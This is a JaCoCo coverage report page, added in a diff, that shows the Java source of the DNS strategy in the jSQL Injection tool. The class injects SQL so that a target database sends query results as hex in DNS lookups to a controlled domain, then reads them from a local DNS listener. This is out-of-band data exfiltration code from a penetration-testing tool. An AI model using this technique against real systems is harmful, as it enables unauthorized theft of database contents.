@@ -1,0 +1,208 @@
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html xmlns="http://www.w3.org/1999/xhtml" lang=""><head><meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/><link rel="stylesheet" href="../jacoco-resources/report.css" type="text/css"/><link rel="shortcut icon" href="../jacoco-resources/report.gif" type="image/gif"/><title>StrategyDns.java</title><link rel="stylesheet" href="../jacoco-resources/prettify.css" type="text/css"/><script type="text/javascript" src="../jacoco-resources/prettify.js"></script></head><body onload="window['PR_TAB_WIDTH']=4;prettyPrint()"><div class="breadcrumb" id="breadcrumb"><span class="info"><a href="../jacoco-sessions.html" class="el_session">Sessions</a></span><a href="../index.html" class="el_report">model</a> &gt; <a href="index.source.html" class="el_package">com.jsql.model.injection.strategy</a> &gt; <span class="el_source">StrategyDns.java</span></div><h1>StrategyDns.java</h1><pre class="source lang-java linenums">/*******************************************************************************
+ * Copyhacked (H) 2012-2025.
+ * This program and the accompanying materials
+ * are made available under no term at all, use it like
+ * you want, but share and discuss it
+ * every time possible with every body.
+ *
+ * Contributors:
+ *      ron190 at ymail dot com - initial implementation
+ *******************************************************************************/
+package com.jsql.model.injection.strategy;
+
+import com.jsql.model.InjectionModel;
+import com.jsql.model.accessible.ResourceAccess;
+import com.jsql.model.bean.util.Interaction;
+import com.jsql.model.bean.util.Request;
+import com.jsql.model.exception.StoppedByUserSlidingException;
+import com.jsql.model.injection.strategy.blind.AbstractInjectionBit.BlindOperator;
+import com.jsql.model.injection.vendor.model.VendorYaml;
+import com.jsql.model.suspendable.AbstractSuspendable;
+import com.jsql.util.I18nUtil;
+import com.jsql.util.LogLevelUtil;
+import com.jsql.util.StringUtil;
+import org.apache.commons.lang3.StringUtils;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+import java.util.regex.Pattern;
+
+public class StrategyDns extends AbstractStrategy {
+
+<span class="fc" id="L32">    private static final Logger LOGGER = LogManager.getRootLogger();</span>
+    private BlindOperator blindOperator;
+    private final DnsServer dnsServer;
+
+    public StrategyDns(InjectionModel injectionModel) {
+<span class="fc" id="L37">        super(injectionModel);</span>
+<span class="fc" id="L38">        this.dnsServer = new DnsServer(injectionModel);</span>
+<span class="fc" id="L39">    }</span>
+
+    @Override
+    public void checkApplicability() throws StoppedByUserSlidingException {
+<span class="fc bfc" id="L43" title="All 2 branches covered.">        if (this.injectionModel.getMediatorUtils().getPreferencesUtil().isStrategyDnsDisabled()) {</span>
+<span class="fc" id="L44">            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, AbstractStrategy.FORMAT_SKIP_STRATEGY_DISABLED, this.getName());</span>
+<span class="fc" id="L45">            return;</span>
+<span class="fc" id="L46">        } else if (</span>
+<span class="fc bfc" id="L47" title="All 2 branches covered.">            StringUtils.isEmpty(this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getDns())</span>
+        ) {
+<span class="fc" id="L49">            LOGGER.log(</span>
+                LogLevelUtil.CONSOLE_INFORM,
+                AbstractStrategy.FORMAT_STRATEGY_NOT_IMPLEMENTED,
+<span class="fc" id="L52">                this.getName(),</span>
+<span class="fc" id="L53">                this.injectionModel.getMediatorVendor().getVendor()</span>
+            );
+<span class="fc" id="L55">            return;</span>
+        }
+
+<span class="fc" id="L58">        this.checkInjection(BlindOperator.OR);</span>
+<span class="fc" id="L59">        this.checkInjection(BlindOperator.AND);</span>
+<span class="fc" id="L60">        this.checkInjection(BlindOperator.STACK);</span>
+<span class="fc" id="L61">        this.checkInjection(BlindOperator.NO_MODE);</span>
+
+<span class="pc bpc" id="L63" title="1 of 2 branches missed.">        if (this.isApplicable) {</span>
+<span class="nc" id="L64">            this.allow();</span>
+        } else {
+<span class="fc" id="L66">            this.unallow();</span>
+        }
+<span class="fc" id="L68">    }</span>
+
+    private void checkInjection(BlindOperator blindOperator) {
+<span class="pc bpc" id="L71" title="1 of 2 branches missed.">        if (this.isApplicable) {</span>
+<span class="nc" id="L72">            return;</span>
+        }
+<span class="fc" id="L74">        this.blindOperator = blindOperator;</span>
+<span class="fc" id="L75">        LOGGER.log(</span>
+            LogLevelUtil.CONSOLE_DEFAULT,
+            &quot;{} [{}] with [{}]...&quot;,
+<span class="fc" id="L78">            () -&gt; I18nUtil.valueByKey(AbstractStrategy.KEY_LOG_CHECKING_STRATEGY),</span>
+            this::getName,
+<span class="fc" id="L80">            () -&gt; blindOperator</span>
+        );
+<span class="fc" id="L82">        String vendorSpecificWithOperator = this.injectionModel.getMediatorVendor().getVendor().instance().sqlDns(</span>
+<span class="fc" id="L83">            String.format(</span>
+                &quot;(select concat('', %s))&quot;,
+<span class="fc" id="L85">                this.injectionModel.getMediatorVendor().getVendor().instance().getModelYaml().getStrategy().getConfiguration().getFailsafe().replace(VendorYaml.INDICE, &quot;1&quot;)</span>
+            ),
+            &quot;1&quot;,
+            blindOperator,
+            false
+        );
+
+<span class="fc" id="L92">        new Thread(this.dnsServer::listen).start();</span>
+<span class="fc" id="L93">        this.injectionModel.injectWithoutIndex(vendorSpecificWithOperator, &quot;dns#confirm&quot;);</span>
+<span class="fc" id="L94">        this.waitDnsResponse(2500);</span>
+
+<span class="fc" id="L96">        var domainName = this.injectionModel.getMediatorUtils().getPreferencesUtil().getDnsDomain();</span>
+<span class="fc" id="L97">        this.isApplicable = this.dnsServer.getResults().stream().anyMatch(</span>
+<span class="nc bnc" id="L98" title="All 4 branches missed.">            s -&gt; s.contains(domainName) &amp;&amp; s.contains(StringUtil.toHex(ResourceAccess.WEB_CONFIRM_RESULT))</span>
+        );
+<span class="pc bpc" id="L100" title="1 of 2 branches missed.">        if (this.isApplicable) {</span>
+<span class="nc" id="L101">            this.dnsServer.getResults().clear();</span>
+<span class="nc" id="L102">            LOGGER.log(</span>
+                LogLevelUtil.CONSOLE_SUCCESS,
+                &quot;{} [{}] with [{}]&quot;,
+<span class="nc" id="L105">                () -&gt; I18nUtil.valueByKey(AbstractStrategy.KEY_LOG_VULNERABLE),</span>
+                this::getName,
+<span class="nc" id="L107">                this.blindOperator::name</span>
+            );
+        } else {
+<span class="fc" id="L110">            this.dnsServer.close();</span>
+        }
+<span class="fc" id="L112">    }</span>
+
+    @Override
+    public void allow(int... i) {
+<span class="nc" id="L116">        this.injectionModel.appendAnalysisReport(</span>
+<span class="nc" id="L117">            StringUtil.formatReport(LogLevelUtil.COLOR_BLU, &quot;### Strategy: &quot; + this.getName())</span>
+<span class="nc" id="L118">            + this.injectionModel.getReportWithoutIndex(</span>
+<span class="nc" id="L119">                this.injectionModel.getMediatorVendor().getVendor().instance().sqlDns(</span>
+<span class="nc" id="L120">                    StringUtil.formatReport(LogLevelUtil.COLOR_GREEN, &quot;&amp;lt;query&amp;gt;&quot;),</span>
+                    &quot;1&quot;,
+                    this.blindOperator,
+                    true
+                ),
+                &quot;metadataInjectionProcess&quot;,
+                null
+            )
+        );
+<span class="nc" id="L129">        this.markVulnerability(Interaction.MARK_DNS_VULNERABLE);</span>
+<span class="nc" id="L130">    }</span>
+
+    @Override
+    public void unallow(int... i) {
+<span class="fc" id="L134">        this.markVulnerability(Interaction.MARK_DNS_INVULNERABLE);</span>
+<span class="fc" id="L135">    }</span>
+
+    @Override
+    public String inject(String sqlQuery, String startPosition, AbstractSuspendable stoppable, String metadataInjectionProcess) throws StoppedByUserSlidingException {
+<span class="nc" id="L139">        new Thread(() -&gt; this.injectionModel.injectWithoutIndex(</span>
+<span class="nc" id="L140">            this.injectionModel.getMediatorVendor().getVendor().instance().sqlDns(</span>
+                sqlQuery,
+                startPosition,
+                this.blindOperator,
+                false
+            ),
+            metadataInjectionProcess
+<span class="nc" id="L147">        )).start();</span>
+<span class="nc" id="L148">        this.waitDnsResponse(5000);</span>
+
+<span class="nc" id="L150">        String result = this.dnsServer.getResults().get(0);</span>
+<span class="nc" id="L151">        var domainName = this.injectionModel.getMediatorUtils().getPreferencesUtil().getDnsDomain();</span>
+<span class="nc" id="L152">        String regexToMatchTamperTags = String.format(&quot;(?i).{3}\\.([a-z0-9]*)\\..{3}\\.%s\\.&quot;, domainName);</span>
+<span class="nc" id="L153">        var matcherSql = Pattern.compile(regexToMatchTamperTags).matcher(result);</span>
+<span class="nc bnc" id="L154" title="All 2 branches missed.">        if (matcherSql.find()) {</span>
+<span class="nc" id="L155">            result = matcherSql.group(1);</span>
+        } else {
+<span class="nc" id="L157">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Incorrect DNS response: {}&quot;, result);</span>
+        }
+<span class="nc" id="L159">        this.dnsServer.getResults().clear();</span>
+<span class="nc" id="L160">        return StringUtil.fromHex(result);</span>
+    }
+
+    private void waitDnsResponse(int maxTime) {
+<span class="fc" id="L164">        int currentTime = 0;</span>
+<span class="pc bpc" id="L165" title="1 of 4 branches missed.">        while (this.dnsServer.getResults().isEmpty() &amp;&amp; currentTime &lt;= maxTime) {</span>
+            try {
+<span class="fc" id="L167">                int waitTime = 250;</span>
+<span class="fc" id="L168">                Thread.sleep(waitTime);</span>
+<span class="fc" id="L169">                currentTime += waitTime;</span>
+<span class="nc" id="L170">            } catch (InterruptedException e) {</span>
+<span class="nc" id="L171">                LOGGER.log(LogLevelUtil.IGNORE, e, e);</span>
+<span class="nc" id="L172">                Thread.currentThread().interrupt();</span>
+<span class="pc" id="L173">            }</span>
+        }
+<span class="pc bpc" id="L175" title="1 of 2 branches missed.">        if (currentTime &gt; maxTime) {</span>
+<span class="fc" id="L176">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Missing DNS response after {} ms&quot;, maxTime);</span>
+        }
+<span class="fc" id="L178">    }</span>
+
+    @Override
+    public void activateWhenApplicable() {
+<span class="pc bpc" id="L182" title="1 of 4 branches missed.">        if (this.injectionModel.getMediatorStrategy().getStrategy() == null &amp;&amp; this.isApplicable()) {</span>
+<span class="nc" id="L183">            LOGGER.log(</span>
+                LogLevelUtil.CONSOLE_INFORM,
+                &quot;{} [{}] with [{}]&quot;,
+<span class="nc" id="L186">                () -&gt; I18nUtil.valueByKey(&quot;LOG_USING_STRATEGY&quot;),</span>
+                this::getName,
+<span class="nc" id="L188">                this.blindOperator::name</span>
+            );
+<span class="nc" id="L190">            this.injectionModel.getMediatorStrategy().setStrategy(this);</span>
+
+<span class="nc" id="L192">            var request = new Request();</span>
+<span class="nc" id="L193">            request.setMessage(Interaction.MARK_DNS_STRATEGY);</span>
+<span class="nc" id="L194">            this.injectionModel.sendToViews(request);</span>
+        }
+<span class="fc" id="L196">    }</span>
+    
+    @Override
+    public String getPerformanceLength() {
+<span class="nc" id="L200">        return VendorYaml.DEFAULT_CAPACITY;</span>
+    }
+    
+    @Override
+    public String getName() {
+<span class="fc" id="L205">        return &quot;Dns&quot;;</span>
+    }
+}
+</pre><div class="footer"><span class="right">Created with <a href="http://www.jacoco.org/jacoco">JaCoCo</a> 0.8.14.202510111229</span></div></body></html>
